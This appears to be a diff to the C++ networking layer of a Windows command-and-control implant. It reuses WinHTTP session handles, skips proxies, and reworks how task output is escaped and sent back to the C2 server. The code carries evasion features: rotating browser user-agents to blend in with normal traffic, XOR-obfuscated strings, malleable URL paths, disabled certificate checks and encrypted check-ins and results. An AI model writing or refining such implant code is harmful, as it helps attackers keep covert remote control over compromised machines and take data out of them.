@@ -28,6 +28,9 @@
 
 namespace net {
 
+static HINTERNET hSession = nullptr;
+static HINTERNET hConnect = nullptr;
+
 // ── Configuration ──────────────────────────────────────────────────────────
 // These will be patched at compile time or set via config.
 struct C2Config {
@@ -47,6 +50,34 @@ struct C2Config {
         return std::max(1000, sleep_ms + offset);  // Minimum 1 second
     }
 };
+
+inline std::wstring get_random_ua();
+
+inline void ensure_connection(const C2Config& cfg) {
+    if (hSession && hConnect) return;
+    
+    // Clean up partial handles to prevent leaks
+    if (hConnect) { WinHttpCloseHandle(hConnect); hConnect = nullptr; }
+    if (hSession) { WinHttpCloseHandle(hSession); hSession = nullptr; }
+    
+    std::wstring ua = get_random_ua();
+    hSession = WinHttpOpen(
+        ua.c_str(),
+        WINHTTP_ACCESS_TYPE_NO_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+    
+    if (hSession) {
+        hConnect = WinHttpConnect(
+            hSession,
+            cfg.host.c_str(),
+            static_cast<INTERNET_PORT>(cfg.port), 0);
+        if (!hConnect) {
+            WinHttpCloseHandle(hSession);
+            hSession = nullptr;
+        }
+    }
+}
 
 // ── User-Agent Rotation ────────────────────────────────────────────────────
 // Rotate through common browser user-agents to blend in with normal traffic.
@@ -74,20 +105,8 @@ inline std::string http_request(
     const std::string& beacon_id = ""
 ) {
     std::string response_body;
-
-    std::wstring ua = get_random_ua();
-    HINTERNET hSession = WinHttpOpen(
-        ua.c_str(),
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME,
-        WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return "";
-
-    HINTERNET hConnect = WinHttpConnect(
-        hSession,
-        cfg.host.c_str(),
-        static_cast<INTERNET_PORT>(cfg.port), 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }
+    ensure_connection(cfg);
+    if (!hSession || !hConnect) return "";
 
     DWORD flags = cfg.use_https ? WINHTTP_FLAG_SECURE : 0;
     HINTERNET hRequest = WinHttpOpenRequest(
@@ -98,14 +117,10 @@ inline std::string http_request(
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         flags);
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return "";
-    }
+    if (!hRequest) return "";
 
     WinHttpSetTimeouts(hRequest, 5000, 5000, 5000, 5000);
-
+    
     if (cfg.use_https) {
         DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
@@ -138,8 +153,9 @@ BOOL bResult = WinHttpSendRequest(
     static_cast<DWORD>(body.size()),
     static_cast<DWORD>(body.size()),
     0);
-if (!bResult) goto cleanup;
-
+if (!bResult) {
+    goto cleanup;
+}
     bResult = WinHttpReceiveResponse(hRequest, nullptr);
     if (!bResult) goto cleanup;
 
@@ -160,9 +176,6 @@ if (!bResult) goto cleanup;
 
 cleanup:
     if (hRequest) WinHttpCloseHandle(hRequest);
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
-
     return response_body;
 }
 #else
@@ -264,6 +277,7 @@ inline std::wstring get_malleable_result_path() {
 // Returns the decrypted JSON string with tasks, or "" on failure.
 inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
     std::wstring method = payload.empty() ? XOR_WDEC(XOR_WSTR(L"GET")).c_str() : XOR_WDEC(XOR_WSTR(L"POST")).c_str();
+    
     std::string body = payload.empty() ? "" : crypto::encrypt(payload);
     
     std::wstring path = get_malleable_path(XOR_WDEC(XOR_WSTR(L"/api/v1/ping")).c_str());
@@ -277,27 +291,31 @@ inline std::string checkin(const C2Config& cfg, const std::string& payload = "")
 
 // Send an encrypted result back to the C2 server.
 inline bool send_result(const C2Config& cfg, const std::string& task_id, const std::string& output) {
-    // Build JSON payload
-    std::string json = std::string(XOR_DEC(XOR_STR("{\"task_id\":\"")).c_str()) + task_id + XOR_DEC(XOR_STR("\",\"output\":\"")).c_str();
     // Escape the output for JSON
+    std::string escaped_output;
     for (char c : output) {
-        switch (c) {
-            case '"':  json += XOR_DEC(XOR_STR("\\\"")).c_str(); break;
-            case '\\': json += XOR_DEC(XOR_STR("\\\\")).c_str(); break;
-            case '\n': json += XOR_DEC(XOR_STR("\\n")).c_str();  break;
-            case '\r': json += XOR_DEC(XOR_STR("\\r")).c_str();  break;
-            case '\t': json += XOR_DEC(XOR_STR("\\t")).c_str();  break;
-            default:   json += c;      break;
-        }
+        if (c == '"') escaped_output += "\\\"";
+        else if (c == '\\') escaped_output += "\\\\";
+        else if (c == '\n') escaped_output += "\\n";
+        else if (c == '\r') escaped_output += "\\r";
+        else if (c == '\t') escaped_output += "\\t";
+        else escaped_output += c;
     }
-    json += XOR_DEC(XOR_STR("\"}")).c_str();
+
+    // Build JSON payload
+    std::string json = std::string(XOR_DEC(XOR_STR("{\"task_id\":\"")).c_str()) + task_id + XOR_DEC(XOR_STR("\",\"output\":\"")).c_str() + escaped_output + XOR_DEC(XOR_STR("\"}")).c_str();
 
     std::string encrypted = crypto::encrypt(json);
     if (encrypted.empty()) return false;
-
+    
     std::wstring path = get_malleable_result_path();
     std::string resp = http_request(cfg, XOR_WDEC(XOR_WSTR(L"POST")).c_str(), path, encrypted, cfg.beacon_id);
     return !resp.empty();
+}
+
+inline void cleanup() {
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
 }
 
 }  // namespace net
